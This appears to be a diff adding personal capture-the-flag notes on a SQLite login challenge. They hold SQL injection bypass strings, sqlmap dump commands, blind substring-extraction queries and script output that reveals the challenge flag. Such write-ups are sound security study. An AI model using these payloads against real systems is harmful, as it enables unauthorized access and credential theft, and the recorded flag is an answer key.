@@ -1,0 +1,149 @@
+﻿## Page says First, login as "admin".
+## I did SQL injection and the hint was revealed. (See hint.txt) Hint contains source code of "index.php"
+
+## These SQLi worked. Status code was 200 OK
+
+admin' or 'a' = 'a
+admin' or '1' = '1
+admin' --
+' or 'a' = 'a' --
+
+## These SQLi not worked. Status code was 200 OK
+
+' or 'a' = 'a
+' or '1' = '1
+admin' or 1 = 1
+' --
+admin"' --
+admin'" --
+' or 'a' = 'b' --
+
+## This also worked
+
+ID:
+foo
+Pass:
+' or 'a' = 'a
+
+ID:
+' or 'a' = 'a
+Pass:
+' or 'a' = 'a
+
+## original query
+SELECT * FROM user WHERE id='$id' AND pass='$pass'
+
+## query structured in DB
+SELECT * FROM user WHERE id='admin' or 'a' = 'a' AND pass='$pass'
+SELECT * FROM user WHERE id='foo' AND pass='' or 'a' = 'a'
+
+## According to the hint, DB is SQLite
+
+$db = new PDO('sqlite:database.db');
+
+## Server info
+# curl -I http://ctfq.sweetduet.info:10080/~q6/index.php
+HTTP/1.1 200 OK
+Date: Sun, 17 Apr 2016 15:10:01 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+## $login has the list of id and pass.
+## I somehow has to print the $login
+
+## Maybe file_get_contents() is vulnerable. 
+## What if I could execute file_get_contents('database.db')?
+
+# curl -i http://ctfq.sweetduet.info:10080/~q6/database.db
+HTTP/1.1 403 Forbidden
+Date: Sun, 10 Apr 2016 13:23:45 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 305
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /~q6/database.db
+on this server.</p>
+<hr>
+<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
+</body></html
+
+## ' or 'a' = 'a'; select * from user where id = 'admin
+Didn't reveal admin password
+
+This seems to be blind SQLi
+
+## sqlmap
+http://qiita.com/shyamahira/items/9f80d16c3436f9dea753
+
+git clone https://github.com/sqlmapproject/sqlmap.git
+
+python sqlmap.py -u "http://ctfq.sweetduet.info:10080/~q6/index.php" --data "id=1&pass=2" --dbms SQLite
+
+python sqlmap.py -u "http://ctfq.sweetduet.info:10080/~q6/index.php" --data "id=1&pass=2" --dbms SQLite -T user --dump
+
+[21:48:53] [WARNING] if the problem persists please check that the provided target URL is valid. In case that it is, you can try to rerun with the switch '--random-agent' turned on and/or proxy switches ('--ignore-proxy', '--proxy',...)
+
+python sqlmap.py -u "http://ctfq.sweetduet.info:10080/~q6/index.php" --data "id=1&pass=2" --dbms SQLite -T user --dump --random-agent --ignore-proxy
+
+[22:48:04] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')
+
+python sqlmap.py -u "http://ctfq.sweetduet.info:10080/~q6/index.php" --data "id=1&pass=2" --dbms SQLite -T user --dump --random-agent --ignore-proxy --level 5
+
+python sqlmap.py -u "http://ctfq.sweetduet.info:10080/~q6/" --data "id=1&pass=2" --dbms SQLite -T user --dump --random-agent --ignore-proxy --level 5
+
+### test query
+ascii(lower(substring((SELECT min(TABLENAME) FROM pg_tables whereTABLENAME !~ '^(pg_|sql_)'),1,1))) >110 - ' ;
+
+admin' and substr((select id from user), 1, 1) = 'a' --
+## Congrats!
+
+admin' and substr((select id from user), 1, 1) = 'b' --
+## Login Failed
+
+admin' and substr((select pass from user), 1, 1) = 'F' --
+## Congrats!
+
+admin' and substr((select pass from user), 2, 1) = 'L' --
+## Congrats!
+
+admin' and substr((select pass from user), 3, 1) = 'A' --
+## Congrats!
+
+admin' and substr((select pass from user), 4, 1) = 'G' --
+## Congrats!
+
+admin' and substr((select pass from user), 5, 1) = '_' --
+## Congrats!
+
+admin' and substr((select pass from user), 5, 1) = char(95) --
+
+## using char
+admin' and substr((select id from user), 1, 1) = (char(97)) --
+
+
+[root@NAKAHARA problem06]# python blindSQL.py 
+Progress: K
+Progress: Kp
+Progress: KpW
+Progress: KpWa
+Progress: KpWa4
+Progress: KpWa4j
+Progress: KpWa4ji
+Progress: KpWa4ji3
+Progress: KpWa4ji3u
+Progress: KpWa4ji3uZ
+Progress: KpWa4ji3uZk
+Progress: KpWa4ji3uZk6
+Progress: KpWa4ji3uZk6T
+Progress: KpWa4ji3uZk6Tr
+Progress: KpWa4ji3uZk6TrP
+Progress: KpWa4ji3uZk6TrPK
+Flag is: FLAG_KpWa4ji3uZk6TrPK
